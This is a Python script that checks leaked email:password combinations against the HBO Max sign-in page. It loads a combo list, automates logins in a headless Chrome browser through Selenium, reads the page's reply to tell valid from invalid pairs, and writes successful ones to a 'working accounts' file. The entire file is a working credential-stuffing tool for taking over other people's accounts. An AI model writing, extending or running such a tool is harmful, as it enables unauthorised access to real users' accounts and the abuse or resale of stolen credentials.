import time
import os
import requests
from modules.connection_error import connection_error_try_block as connection_error
from bs4 import BeautifulSoup as soup
from headers.hbo_header import header
from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException, InvalidSessionIdException
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from pathlib import Path
header()
file_directory = str(Path(__file__).parent)+'/hbo'
page = 'https://play.hbomax.com/signIn'
users = []
passwords = []
browser_options = Options()
browser_options.add_argument = ('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')
browser_options.headless = True
os.makedirs('accounts',exist_ok=True)
with open(file_directory, 'r') as hbo:
	for line in hbo.readlines():
			users.append(line.split(':')[0].strip())
			passwords.append(line.split(':')[1].strip())
index = 0
while index != len(users):
	with open('accounts/hbo_working_accounts','a') as account_results:
		try:
			print('\rTrying Combo {} out of {}'.format(index+1, len(users)),end='')
			browser = webdriver.Chrome(options = browser_options)
			browser.set_window_size(500,700)
			browser.get(page)
			time.sleep(4)
			email_input_box = browser.find_element_by_xpath('//*[@id="EmailTextInput"]')
			password_input_box = browser.find_element_by_xpath('//*[@id="PasswordTextInput"]')
			sign_in_button = browser.find_element_by_xpath('//*[@id="root"]/div[1]/div[2]/div[2]/div[2]/div/div/div[1]/div/div[2]/div[2]/div/div/div/div[1]/div/div/div/div[2]/div[1]/div[4]/div[1]/div')
			email_input_box.send_keys(users[index])
			password_input_box.send_keys(passwords[index])
			sign_in_button.click()
			time.sleep(2)
			sign_in_button.click()
			time.sleep(6)
			if browser.find_elements_by_xpath('//*[@id="root"]/div[1]/div[2]/div[2]/div[2]/div/div/div[1]/div/div[2]/div[2]/div/div/div/div[1]/div/div/div/div[2]/div[1]/div[2]/div[2]/div/span'):
				invalid = browser.find_element_by_xpath('//*[@id="root"]/div[1]/div[2]/div[2]/div[2]/div/div/div[1]/div/div[2]/div[2]/div/div/div/div[1]/div/div/div/div[2]/div[1]/div[2]/div[2]/div/span').text
				if 'The email address or password is incorrect. Please try again.' in str(invalid):
					print(" | {}:{} ---> Credentials don't exist".format(users[index],passwords[index]))
			if browser.find_elements_by_xpath('//*[@id="root"]/div[1]/div[2]/div[2]/div[2]/div/div/div[1]/div[2]/div[2]/div[2]/div/div/div/div[1]/div/div/div/div[1]/h1'):
				valid = browser.find_element_by_xpath('//*[@id="root"]/div[1]/div[2]/div[2]/div[2]/div/div/div[1]/div[2]/div[2]/div[2]/div/div/div/div[1]/div/div/div/div[1]/h1').text
				if 'Who Is Watching?' in str(valid):
					print(' | {}:{} ---> Success!'.format(users[index],passwords[index]))
					account_results.write('{}:{} ---> Good Account\n'.format(users[index],passwords[index]))
			index +=1	
		except ElementClickInterceptedException:			
			print(' | Click Intercepted, iteration index was not incremented.')			
		except InvalidSessionIdException:
			print('Session terminated unexpectedly.\n')
			break
		except Exception as e:
			print(e)
			break

